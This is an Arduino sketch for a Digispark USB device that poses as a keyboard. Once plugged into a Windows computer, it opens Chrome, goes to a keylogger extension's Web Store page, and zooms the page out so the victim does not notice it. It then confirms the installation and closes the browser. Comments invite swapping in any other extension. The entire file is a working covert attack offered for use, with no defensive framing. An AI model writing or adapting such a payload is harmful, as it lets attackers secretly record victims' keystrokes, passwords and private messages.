#include "DigiKeyboard.h"
#define KEY_UP_ARROW 0x52
#define KEY_DOWN_ARROW 0x51
#define KEY_LEFT_ARROW 0x50
#define KEY_RIGHT_ARROW 0x4F
void setup() {}

void loop() {

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000); // Delay 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Open the run box by pressing Windows and R button
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("chrome")); // Writes chrome.exe in the run box and executes 
  DigiKeyboard.delay(5000); // extended delay for opening chrome
  DigiKeyboard.print(F("https://chrome.google.com/webstore/detail/fea-keylogger/fgkghpghjcbfcflhoklkcincndlpobja")); // Types in the Chrome extension url (you can even change it to any extension you want)
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Presses enter key for browsing the URL
  DigiKeyboard.delay(2000); // delay
  DigiKeyboard.sendKeyStroke(45, MOD_CONTROL_LEFT); // left control key and minus key to decrease page size (helps to hide the keylogger page)
  DigiKeyboard.sendKeyStroke(45, MOD_CONTROL_LEFT);
  DigiKeyboard.sendKeyStroke(45, MOD_CONTROL_LEFT);
  DigiKeyboard.sendKeyStroke(45, MOD_CONTROL_LEFT);
  DigiKeyboard.sendKeyStroke(45, MOD_CONTROL_LEFT);
  DigiKeyboard.sendKeyStroke(45, MOD_CONTROL_LEFT);
  DigiKeyboard.sendKeyStroke(45, MOD_CONTROL_LEFT); // max zoom out size achieved 25%
  DigiKeyboard.delay(8000); // Increased delay for slow bandwidth (slow page loading hence greater delay)
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // presses enter to add the extension
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(43); // Press the Tab key to confirm the installation from the dialogue box
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(41); // presses esc button
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(23, MOD_CONTROL_LEFT); // control and T for opening a new chrome tab
  DigiKeyboard.delay(250);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); // Closes Chrome browser
  DigiKeyboard.delay(100);

}
